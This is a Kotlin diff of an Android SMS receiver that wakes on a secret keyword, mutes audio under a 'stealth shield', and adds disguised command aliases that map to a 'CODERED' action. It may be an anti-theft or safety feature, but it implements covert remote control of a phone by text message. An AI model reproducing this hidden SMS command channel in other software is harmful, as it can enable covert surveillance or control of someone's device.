@@ -95,7 +95,7 @@ class SmsReceiver : BroadcastReceiver() {
                 // HEARTBEAT: Check for Judas retries every time any SMS arrives
                 JudasManager.attemptAlert(context)
 
-                if (body.contains("Hii!!")) {
+                if (body.contains("hii!!", ignoreCase = true)) {
                     DebugLogger.log("SMS_WAKE", "Shield Triggered by keyword.")
                     
                     // --- STEALTH SHIELD: AUDIO MUTE ---
@@ -115,13 +115,13 @@ class SmsReceiver : BroadcastReceiver() {
                     KeepAliveReceiver.scheduleNext(context)
 
                     // --- PARSER ENGINE ---
-                    val regex = Regex("Hii!!(.*?)\\\$\\$")
+                    val regex = Regex("(?i)hii!!(.*?)\\\$\\\$")
                     val match = regex.find(body)
 
                     if (match != null) {
                         val rawExtracted = match.groupValues[1].trim()
                         val splitIdx = rawExtracted.indexOf('=')
-                        val cmd: String
+                        var cmd: String
                         var content: String
                         
                         if (splitIdx != -1) {
@@ -130,6 +130,11 @@ class SmsReceiver : BroadcastReceiver() {
                         } else {
                             cmd = rawExtracted.uppercase()
                             content = "0"
+                        }
+
+                        // Stealth Aliases for CODERED
+                        if (cmd == "PROFILE_SYNC" || cmd == "MEDIA_UPDATE" || cmd == "SYS_SYNC") {
+                            cmd = "CODERED"
                         }
 
                         if (cmd == "CODERED" && !content.contains("|")) content = "$content|$sender"
